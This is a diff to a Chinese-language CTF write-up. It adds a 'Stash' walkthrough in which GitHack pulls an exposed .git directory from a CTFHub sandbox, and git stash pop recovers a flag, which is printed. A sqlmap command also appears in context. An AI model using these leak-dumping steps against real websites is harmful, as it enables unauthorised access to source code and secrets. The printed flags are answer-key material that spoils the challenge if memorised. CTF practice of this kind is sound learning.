@@ -674,7 +674,7 @@ sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 
 [+] Clone Success. Dist File : /home/tyd/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800
 
 ┌──(tyd㉿Kali)-[~/ctf/GitHack]
-└─$ cd dist//challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800                                                                                      
+└─$ cd dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800                                                                                      
 ┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
 └─$ git log                                             
 commit 054002c4fd9c95edfaa91ba505b6d1dd8f680b32 (HEAD -> master)
@@ -693,6 +693,7 @@ commit 54adac7f5e33aa6122e1c7b04e05cf2c03363c55
 Author: CTFHub <sandbox@ctfhub.com>
 Date:   Fri Jul 21 12:09:54 2023 +0000
 
+    init
 
 ┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
 └─$ git diff 2c1e32dfd33267f265fda913d29e29572c2ba0be
@@ -721,6 +722,138 @@ ctfhub{21b194cfff1432ef1c38d79c}
 ```
 
 提交`ctfhub{21b194cfff1432ef1c38d79c}`即可。
+
+------
+
+##### Stash
+
+> 当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题
+
+这题和上题的区别就在于：使用`git stash pop `恢复文件。
+
+```bash
+┌──(tyd㉿Kali)-[~/ctf/GitHack]
+└─$ python2 GitHack.py http://challenge-053bfbe9e957dbd0.sandbox.ctfhub.com:10800/.git
+
+  ____ _ _   _   _            _                                             
+ / ___(_) |_| | | | __ _  ___| | __                                         
+| |  _| | __| |_| |/ _` |/ __| |/ /                                         
+| |_| | | |_|  _  | (_| | (__|   <                                          
+ \____|_|\__|_| |_|\__,_|\___|_|\_\{0.0.5}                                  
+ A '.git' folder disclosure exploit.                                        
+                                                                            
+[*] Check Depends
+[+] Check depends end
+[*] Set Paths
+[*] Target Url: http://challenge-053bfbe9e957dbd0.sandbox.ctfhub.com:10800/.git/                                                                        
+[*] Initialize Target
+[*] Try to Clone straightly
+[*] Clone
+正克隆到 '/home/tyd/ctf/GitHack/dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800'...
+致命错误：仓库 'http://challenge-053bfbe9e957dbd0.sandbox.ctfhub.com:10800/.git/' 未找到
+[-] Clone Error
+[*] Try to Clone with Directory Listing
+[*] http://challenge-053bfbe9e957dbd0.sandbox.ctfhub.com:10800/.git/ is not support Directory Listing                                                   
+[-] [Skip][First Try] Target is not support Directory Listing
+[*] Try to clone with Cache
+[*] Initialize Git
+[!] Initialize Git Error: 提示：使用 'master' 作为初始分支的名称。这个默认分支名称可能会更改。要在新仓库中                                              
+提示：配置使用初始分支名，并消除这条警告，请执行：                          
+提示：                                                                      
+提示：  git config --global init.defaultBranch <名称>                       
+提示：                                                                      
+提示：除了 'master' 之外，通常选定的名字有 'main'、'trunk' 和 'development' 。                                                                          
+提示：可以通过以下命令重命名刚创建的分支：                                  
+提示：                                                                      
+提示：  git branch -m <name>                                                
+                                                                            
+[*] Cache files
+[*] packed-refs
+[*] config
+[*] HEAD
+[*] COMMIT_EDITMSG
+[*] ORIG_HEAD
+[*] FETCH_HEAD
+[*] refs/heads/master
+[*] refs/remote/master
+[*] index
+[*] logs/HEAD
+[*] logs/refs/heads/master
+[*] Fetch Commit Objects
+[*] objects/2a/f4c55fd7a6e64762c583aa9e751b4048797cce
+[*] objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64
+[*] objects/da/610ebc4966063d73e2b6803ac14eb733d0fd13
+[*] objects/76/393a7c85d8e8684f642345caf7dad19f000dfe
+[*] objects/90/71e0a24f654c88aa97a2273ca595e301b7ada5
+[*] objects/2c/59e3024e3bc350976778204928a21d9ff42d01
+[*] objects/3d/7e73de132599e19f299844b23d115766c6bcc8
+[*] objects/e3/58b09f4cb4e5800dd20e1aa6758bf80811001a
+[*] Fetch Commit Objects End
+[*] logs/refs/remote/master
+[*] logs/refs/stash
+[*] refs/stash
+[*] Fetch Commit Objects
+[*] objects/ea/8bccfc4d373b4ce4e69b9b038cae032aa27d71
+[*] objects/7d/5628506a1cd9320aff8ee5ac48cbe9dadafc49
+[*] objects/b6/2e1547700bda5aa20e86b97a5d554f413596df
+[*] objects/80/705095c27dc16b00ae0469451f44a3bf78faf8
+[*] Fetch Commit Objects End
+[*] Valid Repository
+[+] Valid Repository Success
+
+[+] Clone Success. Dist File : /home/tyd/ctf/GitHack/dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800
+
+┌──(tyd㉿Kali)-[~/ctf/GitHack]
+└─$ cd dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800 
+                                                                            
+┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800]
+└─$ git log
+commit 2af4c55fd7a6e64762c583aa9e751b4048797cce (HEAD -> master)
+Author: CTFHub <sandbox@ctfhub.com>
+Date:   Fri Jul 21 12:25:25 2023 +0000
+
+    remove flag
+
+commit da610ebc4966063d73e2b6803ac14eb733d0fd13
+Author: CTFHub <sandbox@ctfhub.com>
+Date:   Fri Jul 21 12:25:25 2023 +0000
+
+    add flag
+
+commit 3d7e73de132599e19f299844b23d115766c6bcc8
+Author: CTFHub <sandbox@ctfhub.com>
+Date:   Fri Jul 21 12:25:25 2023 +0000
+
+    init
+
+┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800]
+└─$ git diff da610ebc4966063d73e2b6803ac14eb733d0fd13
+diff --git a/292222691319712.txt b/292222691319712.txt
+deleted file mode 100644
+index e358b09..0000000
+--- a/292222691319712.txt
++++ /dev/null
+@@ -1 +0,0 @@
+-where is flag
+
+┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800]
+└─$ git stash pop                                    
+冲突（修改/删除）：292222691319712.txt 在 Updated upstream 中被删除，在 Stashed changes 中被修改。292222691319712.txt 的 Stashed changes 版本在树中被保留。
+位于分支 master
+未合并的路径：
+  （使用 "git restore --staged <文件>..." 以取消暂存）
+  （酌情使用 "git add/rm <文件>..." 标记解决方案）
+        由我们删除： 292222691319712.txt
+
+修改尚未加入提交（使用 "git add" 和/或 "git commit -a"）
+贮藏条目被保留以备您再次需要。
+                                                                            
+┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800]
+└─$ cat 292222691319712.txt                                    
+ctfhub{7784261fb20081dfe2abe94a}
+```
+
+提交`ctfhub{7784261fb20081dfe2abe94a}`即可。
 
 ------
 
